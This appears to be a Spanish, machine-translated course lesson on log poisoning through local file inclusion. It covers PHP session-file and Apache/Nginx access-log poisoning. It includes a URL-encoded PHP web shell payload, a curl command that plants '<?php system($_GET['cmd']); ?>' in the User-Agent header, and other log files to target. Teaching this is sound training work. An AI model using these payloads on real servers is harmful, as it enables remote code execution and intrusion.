# Log Poisoning

Hemos visto en secciones anteriores que si incluimos algún archivo que contenga código PHP, se ejecutará, siempre que la función vulnerable tenga la`Execute`privilegios. Los ataques que discutiremos en esta sección confían en el mismo concepto: escribir el código PHP en un campo que controlamos que se registra en un archivo de registro (es decir,`poison`/`contaminate`el archivo de registro) e incluye ese archivo de registro para ejecutar el código PHP. Para que este ataque funcione, la aplicación web PHP debería haber leído privilegios sobre los archivos registrados, que varían de un servidor a otro.

Como fue el caso en la sección anterior, cualquiera de las siguientes funciones con`Execute`Los privilegios deben ser vulnerables a estos ataques:

| **Función** | **Leer contenido** | **Ejecutar** | **URL remota** |
| --- | --- | --- | --- |
| **Php** |  |  |  |
| `include()`/`include_once()` | ✅ | ✅ | ✅ |
| `require()`/`require_once()` | ✅ | ✅ | ❌ |
| **Nodejs** |  |  |  |
| `res.render()` | ✅ | ✅ | ❌ |
| **Java** |  |  |  |
| `import` | ✅ | ✅ | ✅ |
| **.NETO** |  |  |  |
| `include` | ✅ | ✅ | ✅ |

---

# **Envenenamiento de la sesión de PHP**

La mayoría de las aplicaciones web de PHP utilizan`PHPSESSID`Cookies, que pueden contener datos específicos relacionados con el usuario en el back-end, para que la aplicación web pueda realizar un seguimiento de los detalles del usuario a través de sus cookies. Estos detalles se almacenan en`session`archivos en el back-end y guardados en`/var/lib/php/sessions/`en Linux y en`C:\Windows\Temp\`En Windows. El nombre del archivo que contiene los datos de nuestro usuario coincide con el nombre de nuestro`PHPSESSID`Cookie con el`sess_`prefijo. Por ejemplo, si el`PHPSESSID`Cookie está configurada para`el4ukv0kqbvoirg7nkp4dncpk3`, entonces su ubicación en el disco sería`/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`.

Lo primero que debemos hacer en un ataque de envenenamiento de la sesión de PHP es examinar nuestro archivo de sesión de PhpSessid y ver si contiene algún dato que podamos controlar y envenenar. Entonces, veremos primero si tenemos un

```
PHPSESSID
```

Cookie establecida en nuestra sesión:

![](https://academy.hackthebox.com/storage/modules/23/rfi_cookies_storage.png)

Como podemos ver, nuestro`PHPSESSID`El valor de las galletas es`nhhv8i0o6ua4g88bkdl9u1fdsd`, por lo que debe almacenarse en`/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`. Intentemos incluir este archivo de sesión a través de la vulnerabilidad de LFI y ver su contenido:

![](https://academy.hackthebox.com/storage/modules/23/rfi_session_include.png)

**Nota:**Como puede adivinar fácilmente, el valor de la cookie diferirá de una sesión a otra, por lo que debe usar el valor de cookies que encuentre en su propia sesión para realizar el mismo ataque.

Podemos ver que el archivo de sesión contiene dos valores:`page`, que muestra la página de idioma seleccionado y`preference`, que muestra el idioma seleccionado. El`preference`El valor no está bajo nuestro control, ya que no lo especificamos en ningún lado y debemos especificarse automáticamente. Sin embargo, el`page`el valor está bajo nuestro control, ya que podemos controlarlo a través del`?language=`parámetro.

Intentemos establecer el valor de`page`un valor personalizado (por ejemplo`language parameter`) y vea si cambia en el archivo de sesión. Podemos hacerlo simplemente visitando la página con`?language=session_poisoning`especificado, como sigue:

Código:url

```
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning

```

Ahora, incluyamos el archivo de sesión una vez más para ver el contenido:

![](https://academy.hackthebox.com/storage/modules/23/lfi_poisoned_sessid.png)

Esta vez, el archivo de sesión contiene`session_poisoning`en lugar de`es.php`, que confirma nuestra capacidad para controlar el valor de`page`en el archivo de sesión. Nuestro próximo paso es realizar el`poisoning`Paso escribiendo código PHP en el archivo de sesión. Podemos escribir un shell web de PHP básico cambiando el`?language=`Parámetro a un shell web codificado por URL, como sigue:

Código:url

```
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E

```

Finalmente, podemos incluir el archivo de sesión y usar el`&cmd=id`Para ejecutar un comandos:

![](https://academy.hackthebox.com/storage/modules/23/rfi_session_id.png)

Nota: Para ejecutar otro comando, el archivo de sesión debe ser envenenado con el shell web nuevamente, ya que se sobrescribe con`/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`Después de nuestra última inclusión. Idealmente, usaríamos el shell web envenenado para escribir un shell web permanente en el directorio web, o enviar un shell inverso para una interacción más fácil.

---

# **Envenenamiento del registro del servidor**

Ambos`Apache`y`Nginx`mantener varios archivos de registro, como`access.log`y`error.log`. El`access.log`El archivo contiene varias información sobre todas las solicitudes realizadas en el servidor, incluida la de cada solicitud`User-Agent`encabezamiento. Como podemos controlar el`User-Agent`Encabezado En nuestras solicitudes, podemos usarlo para envenenar los registros del servidor como lo hicimos anteriormente.

Una vez envenenados, debemos incluir los registros a través de la vulnerabilidad de LFI, y para eso necesitamos tener acceso de lectura sobre los registros.`Nginx`Los registros son legibles por usuarios de bajo privilegiado de forma predeterminada (por ejemplo,`www-data`), mientras el`Apache`Los registros solo son legibles por usuarios con altos privilegios (por ejemplo,`root`/`adm`grupos). Sin embargo, en mayores o mal configurados`Apache`Servidores, estos registros pueden ser legibles por usuarios de baja privilegio.

Por defecto,`Apache`Los registros se encuentran en`/var/log/apache2/`en Linux y en`C:\xampp\apache\logs\`en Windows, mientras`Nginx`Los registros se encuentran en`/var/log/nginx/`en Linux y en`C:\nginx\log\`En Windows. Sin embargo, los registros pueden estar en una ubicación diferente en algunos casos, por lo que podemos usar un[LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)para luchar por sus ubicaciones, como se discutirá en la siguiente sección.

Entonces, intentemos incluir el registro de acceso de Apache desde`/var/log/apache2/access.log`, y ver lo que obtenemos:

![](https://academy.hackthebox.com/storage/modules/23/rfi_access_log.png)

Como podemos ver, podemos leer el registro. El registro contiene el`remote IP address`, `request page`, `response code`, y el`User-Agent`encabezamiento. Como se mencionó anteriormente, el`User-Agent`El encabezado es controlado por nosotros a través de los encabezados de solicitud HTTP, por lo que deberíamos poder envenenar este valor.

**Consejo:**Los registros tienden a ser enormes, y cargarlos en una vulnerabilidad de LFI puede tardar un tiempo en cargarse, o incluso bloquear el servidor en los peores escenarios. Por lo tanto, tenga cuidado y eficiente con ellos en un entorno de producción y no envíe solicitudes innecesarias.

Para hacerlo, usaremos

```
Burp Suite
```

para interceptar nuestra solicitud LFI anterior y modificar el

```
User-Agent
```

encabezado

```
Apache Log Poisoning
```

:

![](https://academy.hackthebox.com/storage/modules/23/rfi_repeater_ua.png)

**Nota:**A medida que se registran todas las solicitudes al servidor, podemos envenenar cualquier solicitud a la aplicación web, y no necesariamente la LFI como lo hicimos anteriormente.

Como se esperaba, nuestro valor de agente de usuario personalizado es visible en el archivo de registro incluido. Ahora podemos envenenar el

```
User-Agent
```

encabezado al configurarlo en un shell web básico de PHP:

![](https://academy.hackthebox.com/storage/modules/23/rfi_cmd_repeater.png)

También podemos envenenar el registro enviando una solicitud a través de Curl, de la siguiente manera:

Envenenamiento por registro

```
xnoxos@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
```

Como el registro ahora debe contener el código PHP, la vulnerabilidad de LFI debe ejecutar este código, y deberíamos poder obtener la ejecución del código remoto. Podemos especificar un comando para ser ejecutado con (

```
&cmd=id
```

):

![](https://academy.hackthebox.com/storage/modules/23/rfi_id_repeater.png)

Vemos que ejecutamos con éxito el comando. Exactamente el mismo ataque se puede llevar a cabo en`Nginx`registros también.

**Consejo:**El`User-Agent`El encabezado también se muestra en los archivos de proceso debajo de Linux`/proc/`directorio. Entonces, podemos intentar incluir el`/proc/self/environ`o`/proc/self/fd/N`Archivos (donde n es un PID generalmente entre 0-50), y podemos realizar el mismo ataque en estos archivos. Esto puede ser útil en caso de que no tengamos acceso de lectura a través de los registros del servidor, sin embargo, estos archivos solo pueden ser legibles por usuarios privilegiados también.

Finalmente, existen otras técnicas similares de envenenamiento de registros que podemos utilizar en varios registros del sistema, dependiendo de los registros de los registros que tengamos acceso. Los siguientes son algunos de los registros de servicio que podemos leer:

- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`

Primero deberíamos intentar leer estos registros a través de LFI, y si tenemos acceso a ellos, podemos tratar de envenenarlos como lo hicimos anteriormente. Por ejemplo, si el`ssh`o`ftp`Los servicios están expuestos a nosotros, y podemos leer sus registros a través de LFI, luego podemos intentar iniciar sesión en ellos y establecer el nombre de usuario en el código PHP, y al incluir sus registros, el código PHP se ejecutaría. Lo mismo aplica el`mail`Servicios, como podemos enviar un correo electrónico que contiene código PHP, y tras su inclusión de registro, el código PHP se ejecutaría. Podemos generalizar esta técnica a cualquier registro que registre un parámetro que controlamos y que podamos leer a través de la vulnerabilidad de LFI.